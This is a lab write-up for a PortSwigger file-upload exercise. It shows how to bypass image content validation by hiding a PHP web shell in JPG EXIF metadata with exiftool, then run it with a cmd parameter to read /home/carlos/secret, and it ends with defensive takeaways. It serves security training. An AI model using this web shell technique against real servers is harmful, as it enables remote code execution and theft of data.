# Remote Code Execution via Polyglot Web Shell Upload

[Remote Code Execution via Polyglot Web Shell Upload](https://portswigger.net/web-security/learning-paths/file-upload-vulnerabilities/flawed-validation-of-the-file-s-contents/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload)

**Difficulty:** Practitioner

**Objective:** Upload a PHP web shell by creating a polyglot file that passes image content validation, then exfiltrate the contents of `/home/carlos/secret`.

This lab is best watched on the YouTube video where we go through the full thought process in real time.

[YouTube Video](https://youtu.be/2VxowVTAYWw)

## Lab Overview

This lab takes file upload validation to a higher level. Unlike previous labs that only checked extensions, Content-Type headers, or basic file properties, this server actually inspects the file contents to verify it's a genuine image. Tricks like changing the extension, modifying headers, or null byte injection won't work here. The server looks at the actual bytes of the file.

The solution: create a file that IS a genuine image but also contains executable PHP code hidden in its metadata.

**Login credentials provided:** `wiener:peter`

## The Problem

Every bypass technique from previous labs fails:
- Uploading `.php` directly is blocked
- Changing Content-Type headers doesn't help
- The server validates the actual file contents
- It checks magic bytes, image headers, and file structure
- If the file isn't a real image, it gets rejected

We need a file that genuinely passes image validation while still containing executable PHP code.

## What is a Polyglot File?

A polyglot file is a file that is simultaneously valid in two or more formats. In this case, we create a file that is both a valid JPG image and a valid PHP script. The image data satisfies the content validation, while the PHP code embedded in the metadata gets executed when the server processes it as PHP.

Image files like JPGs contain metadata fields (EXIF data) that can store arbitrary text. By injecting PHP code into one of these metadata fields, the image remains structurally valid while carrying an executable payload.

## The Exploit

### Step 1: Confirm Previous Techniques Fail

Upload a standard PHP webshell. Rejected. Try Content-Type manipulation. Rejected. Try null byte injection. Rejected. The server is checking the actual file contents and confirming it's a real image.

### Step 2: Create the Polyglot File

Use ExifTool to inject PHP code into a real JPG image's Comment metadata field:

    exiftool -Comment="<?php system($_GET['cmd']); ?>" input.jpg -o polyglot.php

This command takes a legitimate JPG image, injects our PHP webshell into the Comment EXIF field, and saves the result with a `.php` extension.

The resulting file:
- Has valid JPG magic bytes and image structure (passes content validation)
- Contains PHP code in its metadata (executes when processed as PHP)
- Has a `.php` extension (tells the server to process it as PHP)

### Step 3: Upload the Polyglot

Upload `polyglot.php` as your avatar. The server inspects the contents, sees valid JPG image data, and accepts the upload.

### Step 4: Execute the Webshell

Access the uploaded file:

    GET /files/avatars/polyglot.php?cmd=cat+/home/carlos/secret

The server processes the file as PHP because of the `.php` extension. PHP parses through the binary image data (which it ignores as non-PHP content) until it hits the `<?php` tag in the metadata, then executes our code.

Carlos's secret is returned in the response, surrounded by binary image data. Search for it in the response body.

Submit the secret to solve the lab.

## Why This Worked

The server had two separate systems that made independent decisions:

1. **The upload validator** checked the file contents and confirmed it was a valid JPG image. It passed because the file genuinely is a valid JPG.
2. **The PHP interpreter** processed the file when it was requested with a `.php` extension. It scanned through the binary data, found the `<?php` opening tag in the EXIF metadata, and executed everything between `<?php` and `?>`.

Neither system was wrong individually. The image validator correctly identified a valid image. The PHP interpreter correctly executed PHP code it found in the file. The vulnerability exists because these two systems don't coordinate — the validator approves the file as safe, and the interpreter executes the payload hidden inside it.

## Key Takeaways

- **Content validation alone is not enough.** Even deep file inspection can be bypassed if the file is genuinely valid in the expected format while simultaneously containing code in metadata or unused data sections.

- **Polyglot files exploit the gap between validators.** When one system checks content and another system processes it, a file that satisfies both can slip through.

- **Strip metadata from uploaded files.** Processing uploads through an image library that strips EXIF data would have removed the PHP payload while preserving the image. Tools like ImageMagick or GD can re-encode images, destroying any embedded code.

- **Never execute uploaded files directly.** Serve uploaded files through a handler that sets the Content-Type explicitly and never passes them through a script interpreter. Store them outside the web root with random filenames.

- **ExifTool is both a defensive and offensive tool.** Defenders can use it to inspect uploads for suspicious metadata. Attackers can use it to inject payloads. Know both sides.

## Tools Used

- Burp Suite Community Edition
- ExifTool (for creating the polyglot file)